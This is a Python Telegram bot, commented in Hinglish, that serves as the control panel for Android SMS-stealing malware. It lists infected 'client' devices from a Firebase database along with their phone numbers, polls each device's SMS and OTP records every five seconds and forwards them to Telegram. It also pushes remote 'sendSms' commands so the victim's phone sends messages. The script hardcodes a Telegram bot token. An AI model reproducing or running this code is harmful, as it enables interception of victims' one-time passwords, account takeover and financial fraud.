import logging
import requests
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Global variables
firebase_base = None
selected_device_id = None
monitored_channel_id = None
is_monitoring = False

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🤖 **Welcome to the Bot!**\n\n"
        "Ye bot tumhari devices aur channel ke beech data ko manage karta hai.\n"
        "Shuruat karne ke liye niche di gayi commands ka follow karein:\n\n"
        "1. /setfirebase <url> : Firebase database connection set karein.\n"
        "2. /setdevice : Apni device list dekhein aur select karein.\n"
        "3. /addchannel <channel_id> : Channel connect karein.\n"
        "4. /startmoniter : Monitoring start karein.\n\n"
        "🔥 **Step 1: Firebase URL set karne ke liye /setfirebase command use karein.**"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global firebase_base
    if not context.args:
        await update.message.reply_text("❌ Usage: /setfirebase <url>\nExample: /setfirebase https://your-db.firebaseio.com")
        return
    
    url = context.args[0].replace('.json', '').rstrip('/')
    if not url.endswith('/clients'):
        firebase_base = f"{url}/clients"
    else:
        firebase_base = url
        
    await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')

async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global firebase_base
    if not firebase_base:
        await update.message.reply_text("❌ Pehle /setfirebase <url> use karo!")
        return
    
    try:
        response = requests.get(f"{firebase_base}.json")
        clients = response.json()
        if not clients:
            await update.message.reply_text("Koi clients nahi mile.")
            return

        keyboard = []
        msg_lines = ["📱 DEVICES LIST:\n"]
        for client_id, info in clients.items():
            name = info.get('modelName', 'Unknown') 
            battery = info.get('battery', 'N/A')
            status = "ONLINE" if info.get('status') == True else "OFFLINE"
            msg_lines.append(f"• {name} | {battery} | {status}")
            keyboard.append([InlineKeyboardButton(f"View {name}", callback_data=client_id)])

        await update.message.reply_text("\n".join(msg_lines), reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_device_id
    query = update.callback_query
    await query.answer()
    client_id = query.data
    selected_device_id = client_id
    
    try:
        response = requests.get(f"{firebase_base}/{client_id}.json")
        details = response.json()
        if not details:
            await query.edit_message_text("Details nahi mile.")
            return

        status = "ONLINE" if details.get('status') == True else "OFFLINE"
        msg = (f"📱 {details.get('modelName', 'Unknown')}\n"
               f"🆔 {client_id}\n"
               f"📞 {details.get('mobNo', 'Unknown')}\n"
               f"🔋 {details.get('battery', 'N/A')}\n"
               f"{status}\n\n"
               f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
        await query.edit_message_text(text=msg)
    except Exception as e:
        await query.edit_message_text(f"Error: {str(e)}")

async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global monitored_channel_id
    if not context.args:
        await update.message.reply_text("Usage: /addchannel <channel_id>")
        return
    monitored_channel_id = context.args[0]
    await update.message.reply_text(f"✅ Channel {monitored_channel_id} connected!\n\nNext Step: /startmoniter")

async def monitor_task(chat_id, context):
    global is_monitoring, selected_device_id
    last_sms_key = None
    last_msg_key = None
    
    try:
        sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
        sms_data = requests.get(sms_url).json()
        if sms_data: last_sms_key = list(sms_data.keys())[-1]
        
        msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
        msg_data = requests.get(msg_url).json()
        if msg_data: last_msg_key = list(msg_data.keys())[-1]
    except: pass
    
    while is_monitoring:
        try:
            sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
            sms_data = requests.get(sms_url).json()
            if sms_data and isinstance(sms_data, dict):
                keys = list(sms_data.keys())
                if keys[-1] != last_sms_key:
                    last_sms_key = keys[-1]
                    await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{sms_data[last_sms_key]}")
            
            msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
            msg_data = requests.get(msg_url).json()
            if msg_data and isinstance(msg_data, dict):
                keys = list(msg_data.keys())
                if keys[-1] != last_msg_key:
                    last_msg_key = keys[-1]
                    await context.bot.send_message(chat_id=chat_id, text=f"📩 New Message/OTP:\n{msg_data[last_msg_key]}")
        except: pass
        await asyncio.sleep(5)

async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_monitoring
    if not selected_device_id or not monitored_channel_id:
        await update.message.reply_text("❌ Error: Device aur Channel dono set karna zaroori hai!")
        return
    is_monitoring = True
    asyncio.create_task(monitor_task(update.effective_chat.id, context))
    await update.message.reply_text("🚀 Monitoring Started! Ab sab kuch active hai.")

async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_monitoring, selected_device_id
    if is_monitoring and update.channel_post and str(update.channel_post.chat.id) == monitored_channel_id:
        msg_text = update.channel_post.text or ""
        
        try:
            target_number = ""
            token = ""
            
            if "To:" in msg_text and "Message:" in msg_text:
                target_number = msg_text.split("To:")[1].split("\n")[0].strip()
                token = msg_text.split("Message:")[1].split("\n")[0].strip()
            
            if target_number and token:
                timestamp = int(asyncio.get_event_loop().time() * 1000)
                payload = {
                    "admin_sent": True,
                    "id": f"cmd_{timestamp}_bot",
                    "message": token,
                    "status": "pending",
                    "targetNumber": target_number,
                    "timestamp": timestamp
                }
                
                # 'put' ka use kiya hai taaki path overwrite ho jaye aur device ko command mile
                push_url = f"{firebase_base.replace('/clients', '')}/clients/{selected_device_id}/commands/sendSms.json"
                
                response = requests.put(push_url, json=payload)
                
                if response.status_code == 200:
                    await update.effective_chat.send_message(
                        f"✅ **Sent Successfully!**\n\n"
                        f"🎯 Number: `{target_number}`\n"
                        f"💬 Token: `{token}`"
                    )
                else:
                    await update.effective_chat.send_message(f"❌ Firebase Error: {response.status_code}")
            else:
                await update.effective_chat.send_message("❌ Format mismatch, number ya token nahi mila.")
        except Exception as e:
            await update.effective_chat.send_message(f"❌ Error: {str(e)}")

if __name__ == '__main__':
    TOKEN = '8875646124:AAHmuiKV4k7Yqk2HatPI79hQM6om0CepnJs'
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setfirebase", set_firebase))
    app.add_handler(CommandHandler("setdevice", set_device))
    app.add_handler(CommandHandler("addchannel", add_channel))
    app.add_handler(CommandHandler("startmoniter", start_monitor))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
    app.run_polling()
